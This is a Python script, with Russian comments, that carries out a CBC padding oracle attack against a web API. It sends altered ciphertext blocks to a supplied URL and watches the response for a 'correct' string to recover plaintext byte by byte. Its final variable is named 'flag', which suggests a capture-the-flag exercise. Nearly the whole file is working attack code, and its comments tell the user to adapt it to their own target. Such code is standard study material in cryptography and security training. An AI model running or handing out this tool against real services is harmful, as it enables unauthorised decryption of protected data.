import requests
import base64
import random
import argparse

# Padding Oracle Attack
'''                                PKCS5 padding table
------------------------------------------------------------------------------------------
| Val of clear text len (mod16) | Num of padding bytes added | Val of each padding bytes |
------------------------------------------------------------------------------------------
| 0                             | 16                         | 0x10                      |
| 1                             | 15                         | 0x0F                      |
| 2                             | 14                         | 0x0E                      |
| 3                             | 13                         | 0x0D                      |
| 4                             | 12                         | 0x0C                      |
| 5                             | 11                         | 0x0B                      |
| 6                             | 10                         | 0x0A                      |
| 7                             | 9                          | 0x09                      |
| 8                             | 8                          | 0x08                      |
| 9                             | 7                          | 0x07                      |
| 10                            | 6                          | 0x06                      |
| 11                            | 5                          | 0x05                      |
| 12                            | 4                          | 0x04                      |
| 13                            | 3                          | 0x03                      |
| 14                            | 2                          | 0x02                      |
| 15                            | 1                          | 0x01                      |
------------------------------------------------------------------------------------------
'''

parser = argparse.ArgumentParser(
    description="Oracle padding attack"
)

parser.add_argument(
    "url",
    type=str, 
    help="vulnerable api endpoint, that responds about the correctness of padding")
parser.add_argument(
    "-iv",
    type=str,
    help="initialization vector for cbc aes",
    default=b'\x00'*16
)
parser.add_argument(
    "-p",
    type=str,
    help="path to the encrypted data file",
    default="data.txt",
    dest="path"
)

def attack(iv: bytes, enc: bytes, url: str) -> str:
    cipher_blocs = [enc[i:i + 16] for i in range(0, len(enc), 16)]
    result = ""
    for cb_i in range(len(cipher_blocs) - 1, -1, -1):# начинаем расшифровку от последнего блока шифротекста к первому
        # c2 - блок расшифровываемого шифротекста, с1 - предыдущий блок шифротекста
        if(cb_i == 0):
            c1 = iv
        else:
            c1 = cipher_blocs[cb_i - 1]
        c2 = cipher_blocs[cb_i]
        inter_vector = []# промежуточное состояние блока - после расшифровывания ключём, но до xor с предыдущим блоком
        c1_r = list(random.randbytes(16))

        print("padding")
        for pad_i in range(1, 17):
            print(pad_i, end = " ")
            if(inter_vector):
                for i in range(1, pad_i):
                    c1_r[-i]=inter_vector[-i] ^ pad_i
            
            for sym_i in range(256):
                c1_r[-pad_i] = sym_i
                payload = {"encryptData":base64.b64encode(bytes(bytes(c1_r) + c2))}
                # payload будет меняться в зависимости от требований вашего апи 
                r = requests.get(url=url, params = payload)
                if("correct" in r.text):# в вашем случае это может быть любой код верного ответа
                    inter_vector.insert(0, sym_i ^ pad_i)
                    break

        plaintext = ""
        for c_i in range(len(c1)):
            plaintext += chr(inter_vector[c_i] ^ c1[c_i])
        print("block of plaintext = ", plaintext)
        result = plaintext + result
        inter_vector = []

    print(result)
    return result

if(__name__ == "__main__"):
    args = parser.parse_args()
    url, path, iv = args.url, args.path, args.iv
    enc = base64.b64decode(open(path, "rb").read())
    flag = attack(iv=iv, enc=enc, url=url)